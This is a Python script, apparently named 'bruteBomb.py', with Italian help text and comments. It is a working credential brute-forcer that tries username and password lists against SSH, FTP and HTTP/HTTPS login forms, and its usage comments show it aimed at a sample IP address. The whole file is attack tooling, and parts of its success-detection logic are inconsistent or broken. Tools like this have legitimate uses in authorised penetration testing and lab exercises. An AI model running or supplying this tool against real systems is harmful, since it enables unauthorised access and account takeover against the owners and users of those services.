import argparse
import paramiko
import ftplib
import requests, re
import sys, os
import time

def parse_arguments():
    parser = argparse.ArgumentParser(description="Brute-force SSH, FTP, and HTTP")
    parser.add_argument("-c", "--command", required=True, choices=["ssh", "ftp", "https", "http"], help="Command type (ssh/ftp/https/http)")
    parser.add_argument("-port", "--port", required=False, help="Specify the port (it can be empty)")
    parser.add_argument("-ip", "--ip", required=True, help="Target IP address")
    parser.add_argument("-u", "--username", required=True, help="Username (can be a file or a single string)")
    parser.add_argument("-p", "--passwords", required=True, help="Password file or list of passwords")
    parser.add_argument("-H", "--header", required=False, nargs="+", help="Header HTTP/S. Non sei obbligato ad aggiungerlo")
    parser.add_argument("-d", "--data", nargs="+", required=False, help="Header HTTP/S. I primi due campi da dichiarare sono user e password, puoi aggiungerne altri ma poi devi dichiarare il valore con --valueData")
    parser.add_argument("-vd", "--valueData", nargs="+", required=False, help="Header HTTP/S. Usalo per dare i valori alla data")
    parser.add_argument("-bc", "--badCondition", nargs="+", help="La condizione negativa della risposta del server http/s per continuare a bruteforsare")
    parser.add_argument("-gc", "--goodCondition", nargs="+", help="La condizione positiva della risposta del server http/s per smettere di bruteforsare")
    #EXAMPLES:
    #python bruteBomb.py -c ssh -ip 10.210.96.20 -u "username" -p /file/path/password.txt
    #python bruteBomb.py -c ssh -ip 10.210.96.20 -u username.txt -p /file/path/password.txt
    #python bruteBomb.py -c ssh -port 22 -ip 10.210.96.20 -u username.txt -p /file/path/password.txt
    #python bruteBomb.py -c ftp -ip 10.210.96.20 -u "username" -p /file/path/password.txt
    #python bruteBomb.py -c ftp -ip 10.210.96.20 -u username.txt -p /file/path/password.txt
    #python bruteBomb.py -c ftp -port 21 -ip 10.210.96.20 -u username.txt -p /file/path/password.txt
    return parser.parse_args()

def read_username(string_or_file_path):
    if os.path.isfile(string_or_file_path):
        try:
            with open(string_or_file_path, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"Error: Password file '{string_or_file_path}' not found.")
            sys.exit(1)
    else:
        return [string_or_file_path]

def read_passwords(file_path):
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: Password file '{file_path}' not found.")
        sys.exit(1)

def read_header(header):
    headers = {}
    if header is not None:
        for h in header:
            key, value = h.split(":", 1)
            headers[key.strip()] = value.strip()
    return headers

def build_url(host_or_url, port, protocollo):
    # Aggiungo http:// se manca il protocollo
    if not host_or_url.startswith(("http://", "https://")):
        if protocollo == "http":
            host_or_url = "http://" + host_or_url
        else:
            host_or_url = "https://" + host_or_url
    
    # Se è già presente il percorso dopo /, separo host da path
    if "/" in host_or_url[7:]:  # salta 'http://'
        parts = host_or_url.split("/", 3)
        scheme_host = parts[0] + "//" + parts[2]  # http://host
        path = "/" + parts[3] if len(parts) > 3 else ""
    else:
        scheme_host = host_or_url
        path = ""
    
    # Aggiungo la porta se specificata
    if port:
        # Se c'è già una porta nel host, la rimuovo prima di aggiungere la nuova
        host_only = scheme_host.split(":")[1] if ":" in scheme_host[7:] else scheme_host[7:]
        scheme_host = scheme_host[:7] + host_only + f":{port}"
    
    return scheme_host + path

def read_valueData(valueData):
    value = []
    for v in valueData:
        value.append(v)
    return value

def brute_ssh(ip, port, username, passwords):
    print("[+] SSH BRUTE-FORCE STARTING")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for usr in username:
        passwordFound = False
        for pwd in passwords:
            try:
                ssh.connect(ip, port=port, username=usr, password=pwd, timeout=5)
                print(f"[SSH] Success: {usr}:{pwd}")
                ssh.close()
                passwordFound = True
                break
            except paramiko.AuthenticationException:
                print(f"[SSH] Failed: {usr}:{pwd}")
            except Exception as e:
                print(f"[SSH] Error: {e}")
                time.sleep(1)                    
        if passwordFound == False:
            print(f"[SSH] No password found for {usr} on {ip}")

def brute_ftp(ip, port, username, passwords):
    print("[+] FTP BRUTE-FORCE STARTING")
    for usr in username:
        passwordFound = False
        for pwd in passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, port, timeout=5)  # connessione con porta personalizzata
                ftp.login(usr, pwd)
                print(f"[FTP] Success: {usr}:{pwd}")
                ftp.quit()
                passwordFound = True
                break
            except ftplib.error_perm:
                print(f"[FTP] Failed: {usr}:{pwd}")
            except Exception as e:
                print(f"[FTP] Error: {e}")
                time.sleep(1)
        if passwordFound == False:
            print(f"[FTP] No password found for {usr} on {ip}")

'''def brute_http(url, username, passwords, header, data, negativeCondition):
    print("[+]  BRUTE-FORCE STARTING")
    print("[URL] ", url)
    for user in username:
        passwordFound = False
        for pwd in passwords:
            try:
                datas = {
                    data[0] : user,
                    data[1] : pwd
                }
                response = requests.post(url, headers=header, data=datas, timeout=5) #auth=(user, pwd)
                for badCondition in negativeCondition:
                    if str(badCondition) not in str(response.text):
                        print("[** SERVER RESPONSE SUCCESS **]\n", str(response.text))
                        print(f"[HTTP] Success: {user}:{pwd}")
                        passwordFound = True
                        break
                    else:
                        print(f"[HTTP] Failed: {user}:{pwd}")
            except requests.exceptions.RequestException as e:
                print(f"[HTTP] Error: {e}")
                time.sleep(1)
            if passwordFound: break
        if passwordFound == False:
            print(f"[HTTP] No password found for {user} on {url}")'''


def brute_http(url, username, passwords, header, data, valueData, negativeCondition, positiveCondition):
    print("[+] HTTP BRUTE-FORCE STARTING")
    print("[URL] ", url)
    print("[NEGATIVE CONDITION LIST] ", negativeCondition)
    print("[POSITIVE CONDITION LIST] ", positiveCondition)
    datas = {}
    if valueData is not None:
        for value in data[2:]:
            datas[value] = valueData.pop(0)
    for user in username:
        passwordFound = False
        for pwd in passwords:
            try:
                datas[data[0]] = user
                datas[data[1]] = pwd
                
                print("[SENDING DATA] ", datas)
                response = requests.post(url, headers=header, data=datas, timeout=5) #auth=(user, pwd)
                if positiveCondition is None:
                    for badCondition in negativeCondition:
                        #if str(badCondition) not in str(response.text):
                        if re.search(str(badCondition), str(response.text)):
                            print("[** SERVER RESPONSE SUCCESS **]\n", str(response.text))
                            print(f"[HTTP] Success: {user}:{pwd}")
                            passwordFound = True
                            break
                        else:
                            print(f"[HTTP] Failed - Bad Condition is '{badCondition}': {user}:{pwd}")
                else:
                    for posCondition in positiveCondition:
                        if str(posCondition) not in str(response.text):
                            print("[** SERVER RESPONSE SUCCESS **]\n", str(response.text))
                            print(f"[HTTP] Success: {user}:{pwd}")
                            passwordFound = True
                            break
                        else:
                            print(f"[HTTP] Failed - Good Condition is '{posCondition}': {user}:{pwd}")
            except requests.exceptions.RequestException as e:
                print(f"[HTTP] Error: {e}")
                time.sleep(1)
            if passwordFound: break
        if passwordFound == False:
            print(f"[HTTP] No password found for {user} on {url}")


def brute_https(url, username, passwords, header, data, valueData, negativeCondition, positiveCondition):
    print("[+] HTTPS BRUTE-FORCE STARTING")
    print("[URL] ", url)
    datas = {}
    if valueData is not None:
        for value in valueData[2:]:
            datas[value] = valueData
    for user in username:
        passwordFound = False
        for pwd in passwords:
            try:
                datas[data[0]] = user
                datas[data[1]] = pwd
                
                print("[SENDING DATA] ", datas)
                response = requests.post(url, headers=header, data=datas, timeout=5) #auth=(user, pwd)
                if positiveCondition is None:
                    for badCondition in negativeCondition:
                        if str(badCondition) not in str(response.text):
                            print("[** SERVER RESPONSE SUCCESS **]\n", str(response.text))
                            print(f"[HTTPS] Success: {user}:{pwd}")
                            passwordFound = True
                            break
                        else:
                            print(f"[HTTPS] Failed: {user}:{pwd}")
                else:
                    for posCondition in positiveCondition:
                        if str(posCondition) in str(response.text):
                            print("[** SERVER RESPONSE SUCCESS **]\n", str(response.text))
                            print(f"[HTTPS] Success: {user}:{pwd}")
                            passwordFound = True
                            break
                        else:
                            print(f"[HTTPS] Failed: {user}:{pwd}")
            except requests.exceptions.RequestException as e:
                print(f"[HTTPS] Error: {e}")
                time.sleep(1)
            if passwordFound: break
        if passwordFound == False:
            print(f"[HTTPS] No password found for {user} on {url}")

def main():
    args = parse_arguments()
    #args = parser.parse_args()
    passwords = read_passwords(args.passwords)
    username = read_username(args.username)
    
    if args.command == "ssh":
        if args.port == None: args.port = 22
        brute_ssh(args.ip, int(args.port), username, passwords)

    elif args.command == "ftp":
        if args.port == None: args.port = 21
        brute_ftp(args.ip, int(args.port), username, passwords)

    elif args.command == "http":
        if args.port == None: args.port = 80
        if args.data is None:
            print("[ERROR] data parameter miss. (example: --data 'user' 'password')")
            sys.exit(1)
        args.header = read_header(args.header)
        brute_http(build_url(args.ip, int(args.port), args.command), username, passwords, args.header, args.data, args.valueData, args.badCondition, args.goodCondition)

    elif args.command == "https":
        if args.port == None: args.port = 443
        if args.data is None:
            print("[ERROR] data parameter miss. (example: --data 'user' 'password')")
            sys.exit(1)
        args.header = read_header(args.header)
        brute_https(build_url(args.ip, int(args.port), args.command), username, passwords, args.header, args.data, args.valueData, args.badCondition, args.goodCondition)

if __name__ == "__main__":
    main()
